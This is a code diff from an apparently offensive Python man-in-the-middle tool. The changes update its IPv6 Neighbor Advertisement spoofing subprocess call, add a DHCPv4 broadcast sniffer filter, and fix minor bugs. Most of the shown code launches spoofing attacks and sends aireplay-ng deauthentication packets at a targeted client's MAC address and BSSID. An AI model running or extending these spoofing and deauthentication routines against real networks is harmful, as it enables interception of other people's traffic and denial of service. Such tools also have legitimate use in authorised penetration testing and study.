@@ -79,18 +79,18 @@ def make_arp_spoof(network_interface, target_mac_address, target_ip_address, gat
 
 # region NA spoofing
 def make_na_spoof(network_interface, target_mac_address, target_ipv6_address,
-                  gateway_ipv6_address, dns_ipv6_address=None):
+                  gateway_ipv6_address, dns_ipv6_address: Union[None, str] = None):
 
     # Start Neighbor Advertise spoofing script
     if dns_ipv6_address is not None:
-        sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/icmpv6_na_spoof.py --interface ' + network_interface +
-                   ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
+        sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
+                   ' --technique 2 --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
                    ' --gateway_ip ' + gateway_ipv6_address + ' --dns_ip ' + dns_ipv6_address + ' --quiet &'],
                   shell=True)
     else:
-        sub.Popen(['python ' + project_root_path + '/Scripts/ICMPv6/icmpv6_na_spoof.py --interface ' + network_interface +
-                   ' --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
-                   ' --gateway_ip ' + gateway_ipv6_address + '--quiet &'],
+        sub.Popen(['python3 ' + project_root_path + '/Scripts/ICMPv6/icmpv6_spoof.py --interface ' + network_interface +
+                   ' --technique 2 --target_ip ' + target_ipv6_address + ' --target_mac ' + target_mac_address +
+                   ' --gateway_ip ' + gateway_ipv6_address + ' --quiet &'],
                   shell=True)
 
     # Wait 3 seconds
@@ -187,7 +187,7 @@ def requests_sniffer_prn(request):
     global aireply_stop
 
     # region Stop aireplay-ng
-    if 'DHCP' in request.keys() or 'ICMPv6' in request.keys():
+    if 'DHCPv4' in request.keys() or 'ICMPv6' in request.keys():
         aireply_stop = True
         base.kill_process_by_name('aireplay-ng')
     # endregion
@@ -200,11 +200,27 @@ def requests_sniffer(source_mac_address):
 
     # region Set network filter
     network_filters = {'Ethernet': {'source': source_mac_address}}
+
+    if technique_index == 2:
+        network_filters = {
+            'Ethernet': {
+                'source': source_mac_address,
+                'destination': 'ff:ff:ff:ff:ff:ff'
+            },
+            'IPv4': {
+                'source-ip': '0.0.0.0',
+                'destination-ip': '255.255.255.255'
+            },
+            'UDP': {
+                'source-port': 68,
+                'destination-port': 67
+            }
+        }
     # endregion
 
     # region Start sniffer
     sniff = RawSniff()
-    sniff.start(protocols=['ARP', 'IP', 'IPv6', 'ICMPv6', 'UDP', 'DNS', 'DHCP'],
+    sniff.start(protocols=['ARP', 'IPv4', 'IPv6', 'ICMPv6', 'UDP', 'DHCPv4'],
                 prn=requests_sniffer_prn, filters=network_filters)
     # endregion
 
@@ -217,8 +233,8 @@ def deauth_packets_send(network_interface, network_channel, network_bssid, mac_a
     global aireply_stop
 
     # Start target requests sniffer function
-    tm = ThreadManager(2)
-    tm.add_task(requests_sniffer, mac_address)
+    threat_manager = ThreadManager(2)
+    threat_manager.add_task(requests_sniffer, mac_address)
 
     # Set WiFi channel on interface for send WiFi deauth packets
     sub.Popen(['iwconfig ' + network_interface + ' channel ' + network_channel], shell=True)
@@ -241,7 +257,7 @@ def deauth_packets_send(network_interface, network_channel, network_bssid, mac_a
                                           ' -0 ' + str(deauth_packets_number) + ' -a ' + network_bssid +
                                           ' -c ' + mac_address], shell=True, stdout=sub.PIPE)
             while True:
-                output = aireplay_process.stdout.readline()
+                output = aireplay_process.stdout.readline().decode()
                 if output == '' and aireplay_process.poll() is not None:
                     break
                 if output:
@@ -589,7 +605,7 @@ if __name__ == '__main__':
             base.print_info('Last ip address: ', last_ip_address)
 
             if target_ip_address is not None:
-                base.print_info('Target IP address: ', your_ip_address)
+                base.print_info('Target IP address: ', target_ip_address)
 
             if new_target_ip_address is not None:
                 base.print_info('Target new IP address: ', new_target_ip_address)
@@ -936,6 +952,8 @@ if __name__ == '__main__':
 
             # Wait
             sleep(1)
+
+        # endregion
 
     except KeyboardInterrupt:
 
